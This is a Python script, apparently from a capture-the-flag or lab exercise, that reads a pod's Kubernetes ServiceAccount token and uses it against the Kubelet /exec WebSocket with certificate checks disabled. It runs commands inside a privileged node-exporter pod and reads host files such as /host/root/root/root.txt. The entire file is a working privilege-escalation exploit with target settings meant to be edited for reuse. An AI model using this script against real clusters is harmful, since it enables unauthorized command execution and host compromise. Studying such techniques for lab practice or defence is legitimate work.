#!/usr/bin/env python3
"""Execute a command inside a privileged pod via the Kubelet /exec WebSocket.

Requires the calling ServiceAccount to have `get` on `nodes/proxy` (the
`/exec` endpoint uses `get`; `/run` uses `create` and is often denied).

Run *inside* the pod that holds the SA token, e.g.:
    python3 kube_exec.py "id"
    python3 kube_exec.py "cat /host/root/root/root.txt"
"""
import asyncio
import ssl
import sys
from urllib.parse import quote

import websockets

# --- edit these to match the target -----------------------------------------
NODE = "10.129.244.214"                            # node IP
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
# ---------------------------------------------------------------------------


async def run(cmd_parts: list[str]) -> None:
    token = open(
        "/var/run/secrets/kubernetes.io/serviceaccount/token"
    ).read().strip()

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    qs = "&".join(f"command={quote(p)}" for p in cmd_parts)
    url = (
        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
        f"?output=1&error=1&{qs}"
    )

    async with websockets.connect(
        url,
        ssl=ctx,
        additional_headers={"Authorization": f"Bearer {token}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10,
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    # byte 0 is the channel id; the rest is the payload
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    asyncio.run(run(cmd.split()))
